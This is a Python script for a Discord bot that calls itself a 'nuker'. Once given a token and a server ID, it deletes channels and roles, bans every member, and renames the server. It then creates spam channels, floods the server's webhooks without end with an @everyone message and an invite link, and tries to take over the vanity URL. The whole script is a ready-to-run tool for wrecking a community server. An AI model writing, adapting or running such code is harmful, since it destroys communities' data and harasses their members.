import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import os

TOKEN = input("Enter Bot Token: ")
GUILD_ID = int(input("Enter Guild ID: "))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

async def spam_webhook(webhook_url, message):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.post(webhook_url, json={"content": message})
                print(f"Sent spam to webhook: {webhook_url}")
            except:
                print("Failed to send webhook message")
                break

async def change_vanity_code(guild, new_code):
    vanity_url = f"https://discord.com/api/v10/guilds/{guild.id}/vanity-url"
    headers = {"Authorization": f"Bot {TOKEN}"}
    json_data = {"code": new_code}
    async with aiohttp.ClientSession() as session:
        async with session.patch(vanity_url, headers=headers, json=json_data) as resp:
            if resp.status in [200, 201, 204]:
                print(f"Vanity URL changed to: {new_code}")
            else:
                print(f"Failed to change vanity URL (status: {resp.status})")

@bot.event
async def on_ready():
    print(f"\nLogged in as {bot.user} | GAGAN NUKER\n")
    guild = bot.get_guild(GUILD_ID)

    if not guild:
        print("Guild not found.")
        await bot.close()
        return

    print(f"Nuking: {guild.name} ({guild.id})\n")

    # Delete Channels
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except:
            pass

    # Delete Roles
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except:
                pass

    # Ban Members
    for member in guild.members:
        if member != bot.user:
            try:
                await member.ban(reason="Nuked by GAGAN")
                print(f"Banned: {member.name}")
            except:
                pass

    # Change Server Name
    try:
        await guild.edit(name="Zzz Nuked by Bro")
        print("Server name changed.")
    except:
        pass

    # Create Spam Channels
    for i in range(10):
        try:
            await guild.create_text_channel(f"gagan x axyc")
            print(f"Created channel: zzz-nuked-{i}")
        except:
            pass

    # Spam existing webhooks (if any)
    print("\nSpamming existing webhooks...")
    for channel in guild.text_channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                bot.loop.create_task(spam_webhook(webhook.url, "@everyone GAGAN X AXYC https://discord.gg/Jb88wTX3AQ"))
        except:
            pass

    # Attempt Vanity URL Change
    await change_vanity_code(guild, "rageonfiree")

    print("\nNuke Complete ✅\n")
    await asyncio.sleep(10)
    await bot.close()

bot.run(TOKEN)
